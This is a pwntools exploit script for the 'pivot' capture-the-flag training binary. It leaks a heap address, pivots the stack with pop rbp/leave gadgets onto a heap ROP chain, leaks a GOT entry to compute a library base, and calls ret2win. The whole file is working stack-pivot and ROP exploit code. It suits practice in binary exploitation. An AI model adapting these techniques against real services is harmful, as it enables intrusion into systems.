from typing import Tuple

from pwn import *

HOST = ""
PORT = ""

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level="warn")
    p.sendlineafter(b">", payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn("located EIP/RIP offset at {a}".format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
b *foothold_function+16
b *pwnme+180
c
""".format(
    **locals()
)

# Binary filename
exe = "./pivot"
# exe = "./pivot32"

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"
context.terminal = "tmux splitw -h".split(" ")
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")
libpivot = ELF("./libpivot.so", checksec=False)
libpivot_foothold = 0x0010096A
libpivot_ret2win = 0x00100A81
POP_RBP = 0x00000000004007C8  # pop rbp ; ret
leave = 0x00000000004008EF  # leave ; ret
JMP_RBP = 0x0000000000400CAB  # jmp qword ptr [rbp]
JMP_RAX = 0x00000000004007C1  # jmp rax
JMP_ADDR_RAX = 0x0000000000400C23  # jmp qword ptr [rax]
POP_RAX = 0x00000000004009BB  # pop rax ; ret
POP_RSI_R15 = 0x0000000000400A31  # pop rsi ; pop r15 ; ret
RET = elf.search(asm("ret")).__next__()
# Pass in pattern_size, get back EIP/RIP offset
offset = 40

# Start program
io = start()

# Build the payload
# 64


rop = ROP(elf)
rop.call("puts", [elf.got["foothold_function"]])

# ================ Send the 1st payload - to call the foothold
io.recvuntil(b"pivot: ")
leak_heap = int(io.recvline().strip(), 16)
first_leak_heap = leak_heap

payload_stack_smash = flat({offset: [POP_RBP, leak_heap, leave]})
payload_heap = flat(
    {
        0: [
            elf.search(asm("ret")).__next__(),
            elf.plt["foothold_function"],
            elf.sym["pwnme"],
            rop.chain(),
            elf.sym["pwnme"],
            elf.sym["pwnme"],
            elf.sym["pwnme"],
        ]
    }
)

io.sendafter(b"> ", payload_heap)
info("Leak heap address: " + hex(leak_heap))
io.sendafter(b"> ", payload_stack_smash)


# ============= Send the 2st payload - to leak foothold
io.recvuntil(b"pivot: ")
leak_heap = int(io.recvline().strip(), 16)

offset = 40

payload_stack_smash = flat({offset: []})


payload_heap = flat(
    {
        0: [
            RET,
            RET,
            rop.chain(),
            POP_RBP,
            first_leak_heap,
            elf.sym["pwnme"],
            elf.sym["pwnme"],
        ]
    }
)

io.sendafter(b"> ", payload_heap)
io.sendafter(b"> ", payload_stack_smash)

io.recvline()
leak_foothold_function = u64(io.recvline().strip().ljust(8, b"\x00"))
info("Foothold: " + hex(leak_foothold_function))

libpivot.address = leak_foothold_function - libpivot.sym["foothold_function"]


# ============= Send the 3rd payload - to leak foothold
io.recvuntil(b"pivot: ")
leak_heap = int(io.recvline().strip(), 16)

offset = 40

payload_stack_smash = flat({offset: [libpivot.sym["ret2win"], elf.sym["pwnme"]]})

rop = ROP(elf)
rop.call("puts", [elf.got["foothold_function"]])

payload_heap = flat(
    {0: [RET, RET, rop.chain(), POP_RSI_R15, elf.sym["main"], 0, elf.sym["pwnme"]]}
)

io.sendafter(b"> ", payload_heap)
io.sendafter(b"> ", payload_stack_smash)

# Got Shell?
io.interactive()
